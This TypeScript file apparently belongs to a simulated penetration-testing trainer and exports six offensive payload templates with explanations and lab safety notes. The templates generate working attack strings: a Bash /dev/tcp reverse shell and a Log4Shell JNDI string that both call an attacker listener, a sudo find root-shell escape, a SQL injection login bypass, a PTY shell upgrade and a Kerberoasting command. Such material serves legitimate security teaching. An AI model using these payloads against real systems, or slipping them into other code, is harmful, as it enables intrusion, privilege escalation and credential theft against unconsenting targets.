import { PayloadTemplate } from '../../types/ghostops';

export const OFFENSIVE_PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  {
    id: 'bash-tcp-revshell',
    title: 'Bash TCP Network Redirect Reverse Shell',
    category: 'REVERSE_SHELL',
    description: 'Standard Linux /dev/tcp pseudo-device network socket redirection.',
    educationalExplanation:
      'Uses Bash built-in /dev/tcp/<host>/<port> redirection to establish a bidirectional socket connection between stdin/stdout and the remote listener.',
    safetyNotes:
      'Simulated for virtual pwnbox listener 10.10.14.22. Do not use against unauthorized networks. Does not execute automatically.',
    parameters: [
      { id: 'lhost', label: 'Listener Host (LHOST)', description: 'Simulated Pwnbox attacker IP', defaultValue: '10.10.14.22', placeholder: '10.10.14.22' },
      { id: 'lport', label: 'Listener Port (LPORT)', description: 'Local netcat port', defaultValue: '4444', placeholder: '4444' },
      { id: 'shell', label: 'Shell Binary', description: 'Path to shell', defaultValue: '/bin/bash', placeholder: '/bin/bash' },
    ],
    template: (p: Record<string, string>) => `${p.shell || '/bin/bash'} -i >& /dev/tcp/${p.lhost || '10.10.14.22'}/${p.lport || '4444'} 0>&1`,
  },
  {
    id: 'log4j-jndi-string',
    title: 'Log4Shell CVE-2021-44228 JNDI Injection String',
    category: 'WEB_INJECTION',
    description: 'Java Naming and Directory Interface (JNDI) LDAP referral payload.',
    educationalExplanation:
      'Exploits Apache Log4j 2.x message lookup substitution where ${jndi:ldap:...} triggers an outbound directory lookup executing remote bytecode.',
    safetyNotes:
      'Grounded in the virtual E-Corp HR container (10.10.11.45). Harmless simulated string in test environments.',
    parameters: [
      { id: 'ldapHost', label: 'LDAP Referral Server', description: 'Attacker staging IP', defaultValue: '10.10.14.22', placeholder: '10.10.14.22' },
      { id: 'ldapPort', label: 'LDAP Port', description: 'Referral listening port', defaultValue: '1389', placeholder: '1389' },
      { id: 'className', label: 'Exploit Class Name', description: 'Compiled Java payload name', defaultValue: 'Exploit', placeholder: 'Exploit' },
    ],
    template: (p: Record<string, string>) => `\${jndi:ldap://${p.ldapHost || '10.10.14.22'}:${p.ldapPort || '1389'}/${p.className || 'Exploit'}}`,
  },
  {
    id: 'gtfobins-sudo-find',
    title: 'GTFOBins Sudo Find Root Shell Spawn',
    category: 'PRIVESC',
    description: 'Executes root shell when find has NOPASSWD sudo privileges in /etc/sudoers.',
    educationalExplanation:
      'find -exec invokes the specified command with the privileges of the calling process (root when invoked with sudo), escaping restricted user privileges.',
    safetyNotes:
      'Designed for E-Corp HR machine local privilege escalation challenge.',
    parameters: [
      { id: 'path', label: 'Target Search Path', description: 'Starting directory for find', defaultValue: '.', placeholder: '.' },
      { id: 'shell', label: 'Spawned Shell', description: 'Shell executable', defaultValue: '/bin/sh', placeholder: '/bin/sh' },
    ],
    template: (p: Record<string, string>) => `sudo /usr/bin/find ${p.path || '.'} -exec ${p.shell || '/bin/sh'} \\; -quit`,
  },
  {
    id: 'sqli-auth-bypass-json',
    title: 'SQL Injection Authentication Bypass Payload',
    category: 'WEB_INJECTION',
    description: 'Tautology payload breaking out of single-quoted SQL string literals.',
    educationalExplanation:
      "Injects ' OR 1=1 -- into the username field so the query becomes WHERE username = 'admin' OR 1=1 --' AND password = '***', returning true unconditionally.",
    safetyNotes:
      'Targeted for IronBank Vault (/api/login). Safe educational demonstration of parameterized query requirements.',
    parameters: [
      { id: 'user', label: 'Target Username', description: 'Account to impersonate', defaultValue: 'admin', placeholder: 'admin' },
      { id: 'operator', label: 'Tautology Condition', description: 'Always true logic', defaultValue: '1=1', placeholder: '1=1' },
      { id: 'comment', label: 'Comment Delimiter', description: 'Truncates remaining SQL clause', defaultValue: '--', placeholder: '--' },
    ],
    template: (p: Record<string, string>) => `${p.user || 'admin'}' OR ${p.operator || '1=1'}${p.comment || '--'}`,
  },
  {
    id: 'python-pty-stabilize',
    title: 'Python3 PTY Terminal Stabilizer',
    category: 'SHELL_STABILIZE',
    description: 'Upgrades a basic netcat or raw socket connection to an interactive pseudo-terminal.',
    educationalExplanation:
      'Spawns a full pseudo-terminal (PTY) device via Python pty.spawn(), enabling interactive programs, tab completion, clear, and terminal dimensions.',
    safetyNotes:
      'Virtual Pwnbox terminal helper utility.',
    parameters: [
      { id: 'shell', label: 'Interactive Shell', description: 'Target shell', defaultValue: '/bin/bash', placeholder: '/bin/bash' },
    ],
    template: (p: Record<string, string>) => `python3 -c 'import pty; pty.spawn("${p.shell || '/bin/bash'}")'`,
  },
  {
    id: 'impacket-getuserspns',
    title: 'Impacket GetUserSPNs Kerberoasting Command',
    category: 'AD_KERBEROS',
    description: 'Extracts Kerberos TGS service tickets for accounts with ServicePrincipalName.',
    educationalExplanation:
      'Requests Kerberos TGS tickets encrypted with the service account NTLM hash, allowing offline cracking with hashcat/john without alerting domain controllers.',
    safetyNotes:
      'Calibrated for Corp-DC01 (omnicorp.local).',
    parameters: [
      { id: 'domain', label: 'Target Active Directory Domain', description: 'Domain FQDN', defaultValue: 'omnicorp.local', placeholder: 'omnicorp.local' },
      { id: 'dcIp', label: 'Domain Controller IP', description: 'KDC server address', defaultValue: '10.10.11.99', placeholder: '10.10.11.99' },
    ],
    template: (p: Record<string, string>) => `GetUserSPNs.py ${p.domain || 'omnicorp.local'}/ -dc-ip ${p.dcIp || '10.10.11.99'} -request`,
  },
];
